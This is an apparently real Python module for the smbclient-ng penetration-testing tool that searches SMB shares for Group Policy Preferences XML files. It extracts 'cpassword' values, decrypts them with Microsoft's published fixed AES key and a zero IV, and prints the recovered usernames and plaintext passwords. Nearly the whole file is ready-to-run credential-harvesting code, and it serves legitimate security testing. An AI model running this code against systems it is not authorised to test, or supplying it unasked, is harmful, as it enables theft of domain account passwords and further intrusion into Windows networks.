#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : GPPPasswords.py
# Author             : Podalirius (@podalirius_)
# Date created       : 02 june 2024


import base64
import charset_normalizer
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import impacket
import io
import ntpath
import re
from smbclientng.core.Module import Module
from smbclientng.core.ModuleArgumentParser import ModuleArgumentParser
from smbclientng.core.utils import windows_ls_entry
import xml
from xml.dom import minidom


class GPPPasswords(Module):
    """
    GPPPasswords is a module designed to search and retrieve stored Group Policy Preferences (GPP) passwords from specified network shares. 
    It leverages the SMB protocol to access files across the network, parse them, and extract credentials that are often stored within Group Policy Preferences files.

    This module is particularly useful in penetration testing scenarios where discovering stored credentials can lead to further system access or reveal poor security practices.

    Attributes:
        name (str): The name of the module, used in command line invocation.
        description (str): A brief description of what the module does.

    Methods:
        parseArgs(arguments): Parses and handles command line arguments for the module.
        parse_xmlfile_content(pathtofile): Parses the content of an XML file to extract credentials.
    """

    name = "gpppasswords"
    description = "Searches for Group Policy Preferences Passwords in a share."

    def parseArgs(self, arguments):
        """
        Parses the command line arguments provided to the module.

        This method initializes the argument parser with the module's name and description, and defines all the necessary arguments that the module accepts. It then parses the provided command line arguments based on these definitions.

        Args:
            arguments (str): A string of command line arguments.

        Returns:
            ModuleArgumentParser.Namespace | None: The parsed arguments as a Namespace object if successful, None if there are no arguments or help is requested.
        """

        parser = ModuleArgumentParser(prog=self.name, description=self.description)

        # Adding positional arguments
        parser.add_argument("paths", metavar="PATH", type=str, nargs="*", default=[], help="The starting point(s) for the search.")

        # Adding actions
        parser.add_argument("-ls", action="store_true", default=False, help="List current file in ls -dils format on standard output.")
        parser.add_argument("-download", action="store_true", default=False, help="List current file in ls -dils format on standard output.")

        # Other options
        parser.add_argument("-maxdepth", type=int, help="Descend at most levels (a non-negative integer) levels of directories below the command line arguments.")
        parser.add_argument("-mindepth", type=int, help="Do not apply any tests or actions at levels less than levels (a non-negative integer).")

        if len(arguments.strip()) == 0:
            parser.print_help()
            return None
        else:
            self.options = self.processArguments(parser, arguments)

        return self.options

    def parse_xmlfile_content(self, pathtofile):
        """
        Parses the content of an XML file to extract credentials related to Group Policy Preferences.

        This method attempts to retrieve and parse the content of the specified XML file from the SMB share. It looks for credentials stored within the XML structure, specifically targeting the 'cpassword' attribute which is commonly used for storing encrypted passwords in Group Policy Preferences files.

        Args:
            pathtofile (str): The path to the XML file on the SMB share.

        Returns:
            list: A list of dictionaries, each containing details about found credentials such as username, encrypted and decrypted passwords, and other relevant attributes.
        """

        results = []
        fh = io.BytesIO()
        try:
            # opening the files in streams instead of mounting shares allows for running the script from
            # unprivileged containers
            self.smbSession.smbClient.getFile(self.smbSession.smb_share, pathtofile, fh.write)
        except impacket.smbconnection.SessionError as e:
            return results
        except Exception as e:
            raise
        rawdata = fh.getvalue()
        fh.close()
        gppp_found = False
        encoding = charset_normalizer.detect(rawdata)["encoding"]
        if encoding is not None:
            filecontent = rawdata.decode(encoding).rstrip()
            if "cpassword" in filecontent:
                gppp_found = True
            else:
                if self.config.debug:
                    print("[debug] No cpassword was found in %s" % pathtofile)
    
        if gppp_found:
            try:
                root = minidom.parseString(filecontent)
                xmltype = root.childNodes[0].tagName
                # function to get attribute if it exists, returns "" if empty
                read_or_empty = lambda element, attribute: (element.getAttribute(attribute) if element.getAttribute(attribute) is not None else "")

                # ScheduledTasks
                if xmltype == "ScheduledTasks":
                    for topnode in root.childNodes:
                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
                        for task in task_nodes:
                            for property in task.getElementsByTagName("Properties"):
                                results.append({
                                    "tagName": xmltype,
                                    "attributes": {
                                        "username": read_or_empty(task, "name"),
                                        "runAs": read_or_empty(property, "runAs"),
                                        "cpassword": read_or_empty(property, "cpassword"),
                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
                                        "changed": read_or_empty(property.parentNode, "changed"),
                                    },
                                    "file": pathtofile
                                })
                elif xmltype == "Groups":
                    for topnode in root.childNodes:
                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
                        for task in task_nodes:
                            for property in task.getElementsByTagName("Properties"):
                                results.append({
                                    "tagName": xmltype,
                                    "attributes": {
                                        "username": read_or_empty(property, "newName"),
                                        # "userName": read_or_empty(property, "userName"),
                                        "cpassword": read_or_empty(property, "cpassword"),
                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
                                        "changed": read_or_empty(property.parentNode, "changed"),
                                    },
                                    "file": pathtofile
                                })
                else:
                    for topnode in root.childNodes:
                        task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
                        for task in task_nodes:
                            for property in task.getElementsByTagName("Properties"):
                                results.append({
                                    "tagName": xmltype,
                                    "attributes": {
                                        "username": read_or_empty(property, "newName"),
                                        # "userName": read_or_empty(property, "userName"),
                                        "cpassword": read_or_empty(property, "cpassword"),
                                        "password": self.decrypt_password(read_or_empty(property, "cpassword")),
                                        "changed": read_or_empty(property.parentNode, "changed"),
                                    },
                                    "file": pathtofile
                                })

            except Exception as e:
                raise

        return results

    def decrypt_password(self, pw_enc_b64):
        """
        Decrypts a password from its Base64 encoded form using a known AES key and IV.

        This method takes a Base64 encoded string which is encrypted using AES-CBC with a fixed key and IV as per Microsoft's published details. It decodes the Base64 string, decrypts it using the AES key and IV, and returns the plaintext password.

        Args:
            pw_enc_b64 (str): The Base64 encoded string of the encrypted password.

        Returns:
            str: The decrypted password in plaintext, or an empty string if input is empty or decryption fails.
        """

        if len(pw_enc_b64) != 0:
            # Thank you Microsoft for publishing the key :)
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
            key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
            # Thank you Microsoft for using a fixed IV :)
            iv = b"\x00" * 16
            pad = len(pw_enc_b64) % 4
            if pad == 1:
                pw_enc_b64 = pw_enc_b64[:-1]
            elif pad == 2 or pad == 3:
                pw_enc_b64 += "=" * (4 - pad)
            pw_enc = base64.b64decode(pw_enc_b64)
            ctx = AES.new(key, AES.MODE_CBC, iv)
            pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
            return pw_dec.decode("utf-16-le")
        else:
            # cpassword is empty, cannot decrypt anything.
            return ""

    def __find_callback(self, entry, fullpath, depth):
        """
        Callback function for SMB session find method. This function is called for each entry found in the search.

        This function checks if the entry is a file with an '.xml' extension. If it is, it parses the XML content to extract relevant data such as usernames and passwords. It then prints the file path and the extracted data if the current depth is within the specified minimum and maximum depth range.

        Args:
            entry (SMBEntry): The current file or directory entry being processed.
            fullpath (str): The full path to the current entry.
            depth (int): Depth of the path.
            
        Returns:
            None: This function does not return any value.
        """

        # Match and print results
        do_print_results = True
        if self.options.mindepth is not None:
            if depth < self.options.mindepth:
                do_print_results = False
        if self.options.maxdepth is not None:
            if depth > self.options.maxdepth:
                do_print_results = False
        
        if do_print_results:
            if (not entry.is_directory()) and (entry.get_longname().lower().endswith('.xml')):
                data = self.parse_xmlfile_content(fullpath)
                if data is not None:
                    if len(data) != 0:
                        print("[+] %s" % fullpath)
                        for entry in data:
                            if self.config.no_colors:
                                print("  | username: '%s'" % entry["attributes"]["username"])
                                print("  | password: '%s'" % entry["attributes"]["password"])
                            else:
                                print("  | \x1b[94musername\x1b[0m: '\x1b[93m%s\x1b[0m'" % entry["attributes"]["username"])
                                print("  | \x1b[94mpassword\x1b[0m: '\x1b[93m%s\x1b[0m'" % entry["attributes"]["password"])
                            if len(data) > 1:
                                print("|")
        return None

    def run(self, arguments):
        """
        This function recursively searches for files in a directory hierarchy and prints the results based on specified criteria.

        Args:
            base_dir (str): The base directory to start the search from.
            paths (list): List of paths to search within the base directory.
            depth (int): The current depth level in the directory hierarchy.

        Returns:
            None
        """

        self.options = self.parseArgs(arguments=arguments)

        if self.options is not None:
            # Entrypoint
            try:
                next_directories_to_explore = []
                for path in list(set(self.options.paths)):
                    next_directories_to_explore.append(ntpath.normpath(path) + ntpath.sep)
                next_directories_to_explore = sorted(list(set(next_directories_to_explore)))
                
                self.smbSession.find(
                    paths=next_directories_to_explore,
                    callback=self.__find_callback
                )

            except (BrokenPipeError, KeyboardInterrupt) as e:
                print("[!] Interrupted.")
                self.smbSession.close_smb_session()
                self.smbSession.init_smb_session()



